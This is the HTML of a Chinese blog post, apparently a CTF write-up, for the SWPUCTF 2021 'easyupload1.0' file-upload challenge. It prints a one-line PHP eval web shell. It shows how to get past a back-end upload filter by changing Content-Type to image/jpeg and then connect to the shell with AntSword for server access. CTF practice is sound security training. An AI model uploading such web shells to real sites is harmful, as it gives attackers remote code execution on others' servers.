@@ -1,0 +1,344 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <link rel="preconnect" href="http://cdn.wutongliran.top/" crossorigin />
+    <link href="http://cdn.wutongliran.top/fonts/result.css" rel="stylesheet" />
+    <link rel="preload" as="font" type="font/woff2" href="http://cdn.wutongliran.top/fonts/Lyrio.woff2" crossorigin>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>[SWPUCTF 2021 新生赛]easyupload1.0 - 梧桐漓染的博客</title><meta name="Description" content="桐漓的博客"><meta property="og:title" content="[SWPUCTF 2021 新生赛]easyupload1.0" />
+<meta property="og:description" content="[SWPUCTF 2021 新生赛]easyupload1.0 丢个木马上去 1 &lt;?php @eval($_POST[&#39;Lyrio&#39;]);phpinfo();?&gt; // phpinfo() 在这里充当标记的作用 看样子是被过滤了，查看页面源码，过滤代码不在前端而在后端 后端" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload1.0/" /><meta property="og:image" content="/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-10-26T16:29:00+08:00" />
+<meta property="article:modified_time" content="2023-10-26T16:29:00+08:00" /><meta property="og:site_name" content="Lyrio&#39;s blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/logo.png"/>
+
+<meta name="twitter:title" content="[SWPUCTF 2021 新生赛]easyupload1.0"/>
+<meta name="twitter:description" content="[SWPUCTF 2021 新生赛]easyupload1.0 丢个木马上去 1 &lt;?php @eval($_POST[&#39;Lyrio&#39;]);phpinfo();?&gt; // phpinfo() 在这里充当标记的作用 看样子是被过滤了，查看页面源码，过滤代码不在前端而在后端 后端"/>
+<meta name="application-name" content="Lyrio&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Lyrio&#39;s blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload1.0/" /><link rel="prev" href="/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bez_unserialize/" /><link rel="next" href="/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload2.0/" /><link rel="stylesheet" href="http://cdn.wutongliran.top/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="http://cdn.wutongliran.top/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="http://cdn.wutongliran.top/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="http://cdn.wutongliran.top/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="http://cdn.wutongliran.top/lib/animate/animate.min.css"></noscript>
+    
+    
+    
+    <script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[SWPUCTF 2021 新生赛]easyupload1.0",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload1.0\/"
+        },"genre": "posts","keywords": "CTF, 文件上传漏洞","wordcount":  412 ,
+        "url": "\/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload1.0\/","datePublished": "2023-10-26T16:29:00+08:00","dateModified": "2023-10-26T16:29:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Lyrio"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.1.1" defer type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme; }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('light' === 'light' || 'light' === 'dark' || 'light' === 'black') setTheme('light'), saveTheme('light'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="梧桐漓染的博客"><img
+        class="logo"
+        loading="lazy"
+        src="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        srcset="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 1.5x, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 2x"
+        sizes="auto"
+        alt="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        title="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png" ></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fa fa-book'></i> 文章 </a><a class="menu-item" href="/categories/"><i class='fa fa-tasks'></i> 分类 </a><a class="menu-item" href="/tags/"><i class='fa fa-bookmark'></i> 标签 </a><a class="menu-item" href="/friends/"><i class='fas fa-fw fa-fan fa-spin'></i> 友链 </a><a class="menu-item" href="/about/"><i class='fas fa-spinner fa-pulse'></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="梧桐漓染的博客"><img
+        class="logo"
+        loading="lazy"
+        src="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        srcset="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 1.5x, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 2x"
+        sizes="auto"
+        alt="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        title="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png" ></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fa fa-book'></i>文章</a><a class="menu-item" href="/categories/" title=""><i class='fa fa-tasks'></i>分类</a><a class="menu-item" href="/tags/" title=""><i class='fa fa-bookmark'></i>标签</a><a class="menu-item" href="/friends/" title=""><i class='fas fa-fw fa-fan fa-spin'></i>友链</a><a class="menu-item" href="/about/" title=""><i class='fas fa-spinner fa-pulse'></i>关于</a><a href="#" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content always-active" id="toc-content-auto"><nav id="TableOfContents"></nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[SWPUCTF 2021 新生赛]easyupload1.0</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">Lyrio</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/ctf-writeup/"><i class="far fa-folder fa-fw"></i>CTF-WriteUp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-10-26">2023-10-26</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-10-26">2023-10-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 412 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 1 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><h1 id="swpuctf-2021-新生赛easyupload10" class="headerLink">
+    <a href="#swpuctf-2021-%e6%96%b0%e7%94%9f%e8%b5%9beasyupload10" class="header-mark"></a>[SWPUCTF 2021 新生赛]easyupload1.0</h1><p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/653a249bc458853aef7587cf.jpg" title=" [SWPUCTF 2021 新生赛]easyupload1.0-1" data-thumbnail="https://pic.imgdb.cn/item/653a249bc458853aef7587cf.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/653a249bc458853aef7587cf.jpg"
+            srcset="https://pic.imgdb.cn/item/653a249bc458853aef7587cf.jpg, https://pic.imgdb.cn/item/653a249bc458853aef7587cf.jpg 1.5x, https://pic.imgdb.cn/item/653a249bc458853aef7587cf.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/653a249bc458853aef7587cf.jpg">
+    </a></figure></p>
+<p>丢个木马上去</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Lyrio&#39;</span><span class="p">]);</span><span class="nx">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err"> // phpinfo() 在这里充当标记的作用
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>看样子是被过滤了，查看页面源码，过滤代码不在前端而在后端</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/653a2580c458853aef783947.jpg" title=" [SWPUCTF 2021 新生赛]easyupload1.0-2" data-thumbnail="https://pic.imgdb.cn/item/653a2580c458853aef783947.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/653a2580c458853aef783947.jpg"
+            srcset="https://pic.imgdb.cn/item/653a2580c458853aef783947.jpg, https://pic.imgdb.cn/item/653a2580c458853aef783947.jpg 1.5x, https://pic.imgdb.cn/item/653a2580c458853aef783947.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/653a2580c458853aef783947.jpg">
+    </a></figure></p>
+<p>后端过滤代码是怎么个机制也不知道，只能用绕过的方法一个个去试</p>
+<p>先尝试绕过 MIME 验证</p>
+<p>由于一般是不会过滤图片文件的，BurpSuite 抓包，上传木马，将<code>Content-Type: application/octet-stream</code>改成<code>Content-Type:image/jpeg</code></p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/653a272bc458853aef7d4568.jpg" title=" [SWPUCTF 2021 新生赛]easyupload1.0-3" data-thumbnail="https://pic.imgdb.cn/item/653a272bc458853aef7d4568.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/653a272bc458853aef7d4568.jpg"
+            srcset="https://pic.imgdb.cn/item/653a272bc458853aef7d4568.jpg, https://pic.imgdb.cn/item/653a272bc458853aef7d4568.jpg 1.5x, https://pic.imgdb.cn/item/653a272bc458853aef7d4568.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/653a272bc458853aef7d4568.jpg">
+    </a></figure></p>
+<blockquote>
+<p>Content-Type：</p>
+<ul>
+<li><code>image/jpeg</code>  ：jpg 图片格式</li>
+<li><code>image/png</code>    ：png 图片格式</li>
+<li><code>image/gif</code>    ：gif 图片格式</li>
+<li><code>text/plain</code> ：纯文本格式</li>
+<li><code>text/xml</code>      ：  XML 格式</li>
+<li><code>text/html</code>    ：  HTML 格式</li>
+</ul>
+</blockquote>
+<p>直接绕过</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/653a2752c458853aef7da990.jpg" title=" [SWPUCTF 2021 新生赛]easyupload1.0-4" data-thumbnail="https://pic.imgdb.cn/item/653a2752c458853aef7da990.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/653a2752c458853aef7da990.jpg"
+            srcset="https://pic.imgdb.cn/item/653a2752c458853aef7da990.jpg, https://pic.imgdb.cn/item/653a2752c458853aef7da990.jpg 1.5x, https://pic.imgdb.cn/item/653a2752c458853aef7da990.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/653a2752c458853aef7da990.jpg">
+    </a></figure></p>
+<p>记住木马文件上传的位置，访问一下看能不能执行</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/653a27c4c458853aef7ede6d.jpg" title=" [SWPUCTF 2021 新生赛]easyupload1.0-5" data-thumbnail="https://pic.imgdb.cn/item/653a27c4c458853aef7ede6d.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/653a27c4c458853aef7ede6d.jpg"
+            srcset="https://pic.imgdb.cn/item/653a27c4c458853aef7ede6d.jpg, https://pic.imgdb.cn/item/653a27c4c458853aef7ede6d.jpg 1.5x, https://pic.imgdb.cn/item/653a27c4c458853aef7ede6d.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/653a27c4c458853aef7ede6d.jpg">
+    </a></figure></p>
+<p>phpinfo() 执行了，@eval($_POST[&lsquo;Lyrio&rsquo;]) 应该也执行了</p>
+<p>用蚁剑连接后门</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/653a286fc458853aef80b4bc.jpg" title=" [SWPUCTF 2021 新生赛]easyupload1.0-6" data-thumbnail="https://pic.imgdb.cn/item/653a286fc458853aef80b4bc.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/653a286fc458853aef80b4bc.jpg"
+            srcset="https://pic.imgdb.cn/item/653a286fc458853aef80b4bc.jpg, https://pic.imgdb.cn/item/653a286fc458853aef80b4bc.jpg 1.5x, https://pic.imgdb.cn/item/653a286fc458853aef80b4bc.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/653a286fc458853aef80b4bc.jpg">
+    </a></figure></p>
+<p>到这就算拿到服务器权限</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/653a289ec458853aef813be0.jpg" title=" [SWPUCTF 2021 新生赛]easyupload1.0-7" data-thumbnail="https://pic.imgdb.cn/item/653a289ec458853aef813be0.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/653a289ec458853aef813be0.jpg"
+            srcset="https://pic.imgdb.cn/item/653a289ec458853aef813be0.jpg, https://pic.imgdb.cn/item/653a289ec458853aef813be0.jpg 1.5x, https://pic.imgdb.cn/item/653a289ec458853aef813be0.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/653a289ec458853aef813be0.jpg">
+    </a></figure></p>
+<p>找到并查看 flag.php</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/653a28e6c458853aef820bc8.jpg" title=" [SWPUCTF 2021 新生赛]easyupload1.0-8" data-thumbnail="https://pic.imgdb.cn/item/653a28e6c458853aef820bc8.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/653a28e6c458853aef820bc8.jpg"
+            srcset="https://pic.imgdb.cn/item/653a28e6c458853aef820bc8.jpg, https://pic.imgdb.cn/item/653a28e6c458853aef820bc8.jpg 1.5x, https://pic.imgdb.cn/item/653a28e6c458853aef820bc8.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/653a28e6c458853aef820bc8.jpg">
+    </a></figure></p>
+<blockquote>
+<p>正常来说通过 getshell 拿到 flag 就行了(题目也是这个意思)，但是这个 flag 是错误的，真正的 flag 在 phpinfo 里， CTRL+F 搜索 flag 就能找到，这题有点过于绕了</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/653a2a32c458853aef856f9d.jpg" title="[SWPUCTF 2021 新生赛]easyupload1.0-9" data-thumbnail="https://pic.imgdb.cn/item/653a2a32c458853aef856f9d.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/653a2a32c458853aef856f9d.jpg"
+            srcset="https://pic.imgdb.cn/item/653a2a32c458853aef856f9d.jpg, https://pic.imgdb.cn/item/653a2a32c458853aef856f9d.jpg 1.5x, https://pic.imgdb.cn/item/653a2a32c458853aef856f9d.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/653a2a32c458853aef856f9d.jpg">
+    </a></figure></p>
+</blockquote>
+</div>
+
+        <div class="sponsor">
+        <div class="sponsor-avatar"></div><div class="sponsor-custom"><hr><p><em>当我站在传授他人的角度思考问题时</em></p><p><em>才能真正领悟并融会贯通</em></p><p><em>博客受益者是未来那个遗忘某个技术的自己</em></p><hr></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-10-26</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload1.0/index.md target="_blank" rel="noopener noreferrer">阅读原始文档</a>
+                    </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bez_unserialize/" class="prev" rel="prev" title="[SWPUCTF 2021 新生赛]ez_unserialize"><i class="fas fa-angle-left fa-fw"></i>[SWPUCTF 2021 新生赛]ez_unserialize</a>
+            <a href="/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload2.0/" class="next" rel="next" title="[SWPUCTF 2021 新生赛]easyupload2.0">[SWPUCTF 2021 新生赛]easyupload2.0<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container">
+            <div class="footer-line">
+                <span id="run-time"></span>
+            </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Lyrio</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp">闽ICP备2023013172号</span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div><script>
+                    if('serviceWorker' in navigator) {
+                        navigator.serviceWorker
+                            .register('/sw.min.js', { scope: '/' })
+                            .then(function(registration) {
+                            });
+                
+                        navigator.serviceWorker
+                            .ready
+                            .then(function(registration) {
+                            });
+                    }
+                </script></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><link rel="stylesheet" href="http://cdn.wutongliran.top/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="http://cdn.wutongliran.top/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="http://cdn.wutongliran.top/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="http://cdn.wutongliran.top/lib/katex/copy-tex.min.css"></noscript><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":200},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"table":{"sort":true},"twemoji":true};</script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/twemoji/twemoji.min.js" defer></script><script type="text/javascript" src="/js/twemoji.min.js" defer></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/custom/custom.js"></script></div>
+</body>
+
+</html>
